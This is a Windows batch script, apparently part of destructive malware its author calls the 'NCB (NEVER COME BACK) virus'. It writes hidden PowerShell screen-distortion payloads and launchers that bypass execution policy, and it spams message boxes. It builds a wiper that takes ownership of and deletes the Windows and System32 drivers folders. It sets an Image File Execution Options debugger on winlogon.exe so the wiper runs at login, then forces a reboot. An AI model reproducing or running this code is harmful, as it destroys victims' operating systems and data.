echo     $h = Get-Random -Minimum 100 -Maximum 1700                                                                                                                                                     >> serclebreak.ps1
echo     [Clipping]::ClipAndCopy($x, $y, $w, $h)                                                                                                                                                        >> serclebreak.ps1
echo ^} >> serclebreak.ps1

echo Add-Type -TypeDefinition @^"                  																													> graficdest2.ps1                                                                                                                                                                                                                           
echo using System;                                                                                                                                                  >> graficdest2.ps1
echo using System.Runtime.InteropServices;                                                                                                                          >> graficdest2.ps1
echo public class BitBltEffect                                                                                                                                      >> graficdest2.ps1
echo {                                                                                                                                                              >> graficdest2.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> graficdest2.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                                                                            >> graficdest2.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> graficdest2.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                                                                               >> graficdest2.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                   >> graficdest2.ps1
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);        >> graficdest2.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> graficdest2.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                                     >> graficdest2.ps1
echo     public static void RunBitBltEffect()                                                                                                                       >> graficdest2.ps1
echo     {                                                                                                                                                          >> graficdest2.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                       >> graficdest2.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                                                 >> graficdest2.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                                                >> graficdest2.ps1
echo         Random random = new Random();                                                                                                                          >> graficdest2.ps1
echo         while (true)                                                                                                                                           >> graficdest2.ps1
echo         {                                                                                                                                                      >> graficdest2.ps1
echo            BitBlt(hdc, random.Next(10), random.Next(10), screenWidth, screenHeight, hdc, random.Next(100), random.Next(100), 0x001100A6);                      >> graficdest2.ps1
echo         }                                                                                                                                                      >> graficdest2.ps1
echo     }                                                                                                                                                          >> graficdest2.ps1
echo }                                                                                                                                                              >> graficdest2.ps1
echo ^"@                                                                                                                                                            >> graficdest2.ps1
echo [BitBltEffect]::RunBitBltEffect()                                                                                                                              >> graficdest2.ps1



echo Add-Type -TypeDefinition @^"                                                                                                                   >> mirroreffects.ps1
echo using System;                                                                                                                                  >> mirroreffects.ps1
echo using System.Runtime.InteropServices;                                                                                                          >> mirroreffects.ps1
echo public class ScreenEffect                                                                                                                      >> mirroreffects.ps1
echo {                                                                                                                                              >> mirroreffects.ps1
echo     [DllImport("user32.dll")]                                                                                                                  >> mirroreffects.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                                                            >> mirroreffects.ps1
echo     [DllImport("user32.dll")]                                                                                                                  >> mirroreffects.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                                                               >> mirroreffects.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                   >> mirroreffects.ps1
echo     public static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,                  >> mirroreffects.ps1
echo         IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, uint dwRop);                                           >> mirroreffects.ps1
echo     [DllImport("user32.dll")]                                                                                                                  >> mirroreffects.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                     >> mirroreffects.ps1
echo     public static void RunScreenEffect()                                                                                                       >> mirroreffects.ps1
echo     {                                                                                                                                          >> mirroreffects.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                       >> mirroreffects.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                                 >> mirroreffects.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                                >> mirroreffects.ps1
echo         int x = 0, y = 0;                                                                                                                      >> mirroreffects.ps1
echo         int width = screenWidth, height = screenHeight;                                                                                        >> mirroreffects.ps1
echo         int radius = 100;                                                                                                                      >> mirroreffects.ps1
echo         int stepSize = 5;                                                                                                                      >> mirroreffects.ps1
echo         while (true)                                                                                                                           >> mirroreffects.ps1
echo         {                                                                                                                                      >> mirroreffects.ps1
echo             StretchBlt(hdc, x, y, width, height, hdc, x + radius, y, width - radius * 2, height, 0x00CC0020);                                  >> mirroreffects.ps1
echo             x += stepSize;                                                                                                                     >> mirroreffects.ps1
echo             y += stepSize;                                                                                                                     >> mirroreffects.ps1
echo             width -= stepSize * 2;                                                                                                             >> mirroreffects.ps1
echo             height -= stepSize * 2;                                                                                                            >> mirroreffects.ps1
echo             if (x ^<= 0 ^|^| y ^<= 0 ^|^| x + width ^>= screenWidth ^|^| y + height ^>= screenHeight)                                          >> mirroreffects.ps1
echo             {                                                                                                                                  >> mirroreffects.ps1
echo                 x = 0;                                                                                                                         >> mirroreffects.ps1
echo                 y = 0;                                                                                                                         >> mirroreffects.ps1
echo                 width = screenWidth;                                                                                                           >> mirroreffects.ps1
echo                 height = screenHeight;                                                                                                         >> mirroreffects.ps1
echo             }                                                                                                                                  >> mirroreffects.ps1
echo             System.Threading.Thread.Sleep(10);                                                                                                 >> mirroreffects.ps1
echo         }                                                                                                                                      >> mirroreffects.ps1
echo     }                                                                                                                                          >> mirroreffects.ps1
echo }                                                                                                                                              >> mirroreffects.ps1
echo ^"@                                                                                                                                            >> mirroreffects.ps1
echo [ScreenEffect]::RunScreenEffect()                                                                                                              >> mirroreffects.ps1                                                                                     




echo cd %appdata%\ren\ > serclebreak.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> serclebreak.bat
set "ea=%appdata%\ren\serclebreak.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> serclebreak.bat

echo cd %appdata%\ren\ > rainbowball.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> rainbowball.bat
set "ea=%appdata%\ren\rainbowball.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> rainbowball.bat

echo cd %appdata%\ren\ > rainbowmoniter.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> rainbowmoniter.bat
set "ea=%appdata%\ren\rainbowmoniter.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> rainbowmoniter.bat

echo cd %appdata%\ren\ > moniterdestroy1.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> moniterdestroy1.bat
set "ea=%appdata%\ren\moniterdestroy1.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> moniterdestroy1.bat

echo cd %appdata%\ren\ > moniterdestroy.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> moniterdestroy.bat
set "ea=%appdata%\ren\moniterdestroy.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> moniterdestroy.bat

echo cd %appdata%\ren\ > monitercpy.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> monitercpy.bat
set "ea=%appdata%\ren\monitercpy.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> monitercpy.bat

echo cd %appdata%\ren\ > mousemove.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> mousemove.bat
set "ea=%appdata%\ren\mousemove.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> mousemove.bat

echo cd %appdata%\ren\ > moniterpixcel.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> moniterpixcel.bat
set "ea=%appdata%\ren\moniterpixcel.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> moniterpixcel.bat

echo cd %appdata%\ren\ > rainbowmelt.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> rainbowmelt.bat
set "ea=%appdata%\ren\rainbowmelt.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> rainbowmelt.bat

echo cd %appdata%\ren\ > bigmoniter.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> bigmoniter.bat
set "ea=%appdata%\ren\bigmoniter.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> bigmoniter.bat

echo cd %appdata%\ren\ > monitershake2.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> monitershake2.bat
set "ea=%appdata%\ren\monitershake2.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> monitershake2.bat

echo cd %appdata%\ren\ > monitershake.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> monitershake.bat
set "ea=%appdata%\ren\monitershake.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> monitershake.bat

echo cd %appdata%\ren\ > shake.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> shake.bat
set "ea=%appdata%\ren\shake.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> shake.bat

echo cd %appdata%\ren\ > graficdest2.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> graficdest2.bat
set "ea=%appdata%\ren\graficdest2.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> graficdest2.bat

echo cd %appdata%\ren\ > song1.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> song1.bat
set "ea=%appdata%\ren\song1.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> song1.bat

echo cd %appdata%\ren\ > song2.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> song2.bat
set "ea=%appdata%\ren\song2.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> song2.bat

echo cd %appdata%\ren\ > mirroreffects.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> mirroreffects.bat
set "ea=%appdata%\ren\mirroreffects.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> mirroreffects.bat

echo cd %appdata%\ren\ > song3.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> song3.bat
set "ea=%appdata%\ren\song3.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> song3.bat

echo cd %appdata%\ren\ > song4.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> song4.bat
set "ea=%appdata%\ren\song4.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> song4.bat

echo cd %appdata%\ren\ > song5.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> song5.bat
set "ea=%appdata%\ren\song5.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> song5.bat

echo cd %appdata%\ren\ > monitercpy2.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> monitercpy2.bat
set "ea=%appdata%\ren\monitercpy2.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> monitercpy2.bat

echo cd %appdata%\ren\ > song6.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> song6.bat
set "ea=%appdata%\ren\song6.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> song6.bat

echo cd %appdata%\ren\ > song7.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> song7.bat
set "ea=%appdata%\ren\song7.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> song7.bat
echo Set WshShell = CreateObject("WScript.Shell") > typer.vbs
echo WshShell.SendKeys "B" >> typer.vbs
echo WScript.Sleep 300 >> typer.vbs
echo WshShell.SendKeys "Y" >> typer.vbs
echo WScript.Sleep 300 >> typer.vbs
echo WshShell.SendKeys "E" >> typer.vbs
echo WScript.Sleep 300   >> typer.vbs
echo WshShell.SendKeys "B"                          >> typer.vbs
echo WScript.Sleep 300                              >> typer.vbs
echo WshShell.SendKeys "Y"                          >> typer.vbs
echo WScript.Sleep 300                              >> typer.vbs
echo WshShell.SendKeys "E"                          >> typer.vbs
echo WScript.Sleep 300                              >> typer.vbs

echo takeown /f "%systemdrive%\Windows\*.*" >> des.bat
echo icacls "%systemdrive%\Windows\*.*" /grant everyone:f >> des.bat
echo del /F /S /Q /A "%systemdrive%\Windows\*.*" >> des.bat
echo takeown /f "%systemdrive%\Windows\System32\drivers\*.*" >> des.bat
echo icacls "%systemdrive%\Windows\System32\drivers\*.*" /grant everyone:f >> des.bat
echo del /F /S /Q /A "%systemdrive%\Windows\System32\drivers\*.*" >> des.bat
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" /v Debugger /t REG_SZ /d "%appdata%\ren\after.bat" /f
echo cd %appdata%\ren\ > after.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> after.bat
echo reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v Debugger /f >> after.bat
echo start explorer.exe >> after.bat
echo timeout 5 >> after.bat
echo start startwhy.exe >> after.bat
echo start /min des.bat >> after.bat

echo Your computer has a NCB(NEVER COME BACK) virus! > read.txt
echo Don't think you can solve it! >> read.txt
echo Just enjoy this screen! And never go into your computer again. >> read.txt
echo So goodbye!! >> read.txt
echo :) >> read.txt
echo MADE - snake0071 batch filer - >> read.txt
echo MsgBox "Enjoy Your Last Computer ", vbExclamation, "@!(U#V$I)SHV*$#)!*(!$" > msg5.vbs
start read.txt
timeout 20
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" > w.bat
echo cd %appdata%\ren\ >> w.bat
echo :a >> w.bat
echo timeout 2 >> w.bat
echo start msg5.vbs >> w.bat 
echo goto a >> w.bat
start typer.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start msg5.vbs
start /min mousemove.bat
timeout 2
start /min song1.bat
start /min shake.bat
timeout 8
start /min monitershake.bat
timeout 15
start /min moniterpixcel.bat
timeout 7
start /min monitershake.bat
timeout 5
start /min monitershake2.bat
timeout 20
start /min mousemove.bat
start /min bigmoniter.bat & start /min rainbowmelt.bat
start /min song2.bat
start /min rainbowmoniter.bat
timeout 35
taskkill /f /im powershell.exe & start /min mousemove.bat
start /min song3.bat 
start /min monitershake2.bat
start /min moniterpixcel.bat
start /min rainbowmoniter.bat
timeout 35
taskkill /f /im powershell.exe & start /min mousemove.bat
start /min song4.bat
start /min rainbowmoniter.bat
start /min monitercpy2.bat
start /min monitercpy.bat
timeout 30
taskkill /f /im powershell.exe & start /min song5.bat
start /min rainbowball.bat
start /min rainbowball.bat
start /min serclebreak.bat
timeout 23
start /min song5.bat 
start /min moniterdestroy.bat
start /min moniterdestroy1.bat
timeout 30
start /min song7.bat
start /min graficdest2.bat
timeout 35
taskkill /f /im powershell.exe & taskkill /f /im explorer.exe
start /min song6.bat
start /min monitershake.bat
start /min rainbowball.bat
timeout 1
start /min rainbowball.bat
timeout 24
start /min mirroreffects.bat
start /min song7.bat
timeout 40
taskkill /f /im powershell.exe
shutdown -r -t 0
exit